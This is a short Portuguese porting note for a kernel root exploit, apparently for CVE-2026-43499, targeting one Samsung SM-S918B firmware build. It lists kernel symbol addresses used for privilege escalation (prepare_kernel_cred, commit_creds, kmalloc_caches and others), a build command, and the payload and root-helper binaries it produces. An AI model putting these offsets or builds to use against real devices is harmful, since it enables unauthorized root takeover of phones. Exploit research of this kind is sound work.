# Porting ZZHL — SM-S918B

Perfil usado: `dm3q-S918BXXUAZZHL`.

Os endereços foram obtidos de `../kallsyms_ZZHL.kallsyms` e estão definidos em
`targets/dm3q-S918BXXUAZZHL/target.h`. O kernel usa base virtual
`0xffffffc008000000` e os símbolos principais incluem:

- `prepare_kernel_cred`: `0xffffffc00811e694`
- `commit_creds`: `0xffffffc0081203d0`
- `anon_pipe_buf_ops`: `0xffffffc009e81e60`
- `ashmem_fops`: `0xffffffc00a010238`
- `kmalloc_caches`: `0xffffffc00a067330`

## Compilação reproduzível

```sh
ANDROID_NDK_HOME=/opt/android-sdk/ndk/28.2.13676358 \
make TARGET=dm3q-S918BXXUAZZHL \
  OUTDIR=/home/matias/Downloads/ZZHL/build/dm3q-S918BXXUAZZHL
```

Artefatos gerados:

- `cve-2026-43499-app.so` — payload app
- `cve-2026-43499` — payload preload/root
- `cve-2026-43499-root` — helper root

Os binários compilados ficam em `../build/dm3q-S918BXXUAZZHL/`.
